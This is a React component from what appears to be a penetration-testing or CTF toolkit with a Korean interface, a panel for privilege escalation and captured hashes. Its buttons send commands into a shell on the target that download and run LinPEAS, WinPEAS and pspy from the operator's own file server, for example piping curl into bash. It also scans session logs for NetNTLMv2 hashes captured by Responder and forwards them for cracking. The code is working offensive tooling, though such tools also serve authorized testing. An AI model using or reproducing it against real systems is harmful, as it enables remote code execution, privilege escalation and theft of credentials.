import { useEffect, useState } from "react";
import InteractiveTerminal from "./InteractiveTerminal";
import { extractNtlmv2Hashes } from "./ntlmHash";

type PsexecSession = {id: number; command: string};
type PsexecInputRequest = {id: number; data: string};
type PrivescServer = {
  running: boolean; port?: number; base_url?: string;
  available?: {peass?: boolean; pspy?: boolean};
};

export default function PrivescSessionPanel({session, server, serverBusy,
  inputRequest, onToggleServer, onSendCommand, onClose, onSendHashToCracking,
  targetId}: {
  session?: PsexecSession; server?: PrivescServer; serverBusy: boolean;
  inputRequest?: PsexecInputRequest;
  onToggleServer: () => void;
  onSendCommand: (command: string) => void;
  onClose: () => void;
  onSendHashToCracking?: (hash: string) => void;
  targetId?: number;
}) {
  const [hashes, setHashes] = useState<string[]>([]);
  // The terminal is a raw xterm buffer with no plain-text state to scan, so
  // poll every one of this target's session logs instead of just the one
  // currently open -- a hash Responder already captured in an earlier,
  // now-closed listener is still sitting in that session's persisted log
  // (Responder itself won't reprint a hash it already captured once, so
  // scanning only the live session would silently miss it forever).
  useEffect(() => {
    setHashes([]);
    if (!targetId) return;
    let cancelled = false;
    const poll = async () => {
      const listResponse = await fetch(`/api/interactive-sessions?target_id=${targetId}`);
      if (!listResponse.ok || cancelled) return;
      const sessions: {id: number}[] = await listResponse.json();
      const texts = await Promise.all(sessions.map(async (item) => {
        const logResponse = await fetch(`/api/interactive-sessions/${item.id}/log`);
        return logResponse.ok ? await logResponse.text() : "";
      }));
      if (!cancelled) setHashes(extractNtlmv2Hashes(texts.join("\n")));
    };
    void poll();
    const timer = window.setInterval(poll, 4000);
    return () => { cancelled = true; window.clearInterval(timer); };
  }, [targetId]);
  if (!session) return null;
  const hasPeass = server?.available?.peass ?? true;
  const hasPspy = server?.available?.pspy ?? true;
  return <>
    <section className="privescServer" aria-labelledby="privesc-server-heading">
      <header>
        <h2 id="privesc-server-heading">권한 상승 스크립트 서버 (LinPEAS/WinPEAS/pspy)</h2>
        <small>{server?.running
          ? `tun0에서 서비스 중 · ${server.base_url}`
          : "대상이 접근할 수 있도록 tun0에만 임시 파일서버를 엽니다."}</small>
      </header>
      <div className="privescServerActions">
        <button disabled={serverBusy} onClick={onToggleServer}>
          {serverBusy ? "처리 중…" : server?.running ? "서버 중지" : "서버 시작"}
        </button>
        <button disabled={!server?.running || !hasPeass}
          onClick={() => onSendCommand(
            `curl -sS ${server?.base_url}/peass/linpeas/linpeas.sh | bash`)}>
          LinPEAS 명령 셸에 입력
        </button>
        <button disabled={!server?.running || !hasPeass}
          onClick={() => onSendCommand(
            `curl.exe -o winpeas.exe ${server?.base_url}` +
            `/peass/winpeas/winPEASany.exe && .\\winpeas.exe`)}>
          WinPEAS 명령 셸에 입력
        </button>
        <button disabled={!server?.running || !hasPspy}
          onClick={() => onSendCommand(
            `curl -sS ${server?.base_url}/pspy/pspy64 -o /tmp/pspy64 ` +
            `&& chmod +x /tmp/pspy64 && /tmp/pspy64`)}>
          pspy 명령 셸에 입력
        </button>
      </div>
      {server?.running && !hasPeass &&
        <small>peass가 설치되어 있지 않아 LinPEAS/WinPEAS는 제공할 수 없습니다.</small>}
      {server?.running && !hasPspy &&
        <small>pspy가 설치되어 있지 않아 pspy는 제공할 수 없습니다.</small>}
    </section>
    <InteractiveTerminal sessionId={session.id}
      title={`${session.command} · 검토 후 Enter`}
      initialInput={session.command}
      inputRequest={inputRequest}
      onClose={onClose} />
    {!!hashes.length && onSendHashToCracking && (
      <section className="privescServer" aria-labelledby="captured-hashes-heading">
        <header>
          <h2 id="captured-hashes-heading">캡처된 NetNTLMv2 해시</h2>
        </header>
        <div className="sqlPayloadList">
          {hashes.map((hash) => (
            <div key={hash} className="sqlPayloadRow">
              <div><code>{hash.length > 80 ? `${hash.slice(0, 80)}…` : hash}</code></div>
              <div className="sqlPayloadActions">
                <button onClick={() => onSendHashToCracking(hash)}>Hash Cracking으로 보내기</button>
              </div>
            </div>
          ))}
        </div>
      </section>
    )}
  </>;
}
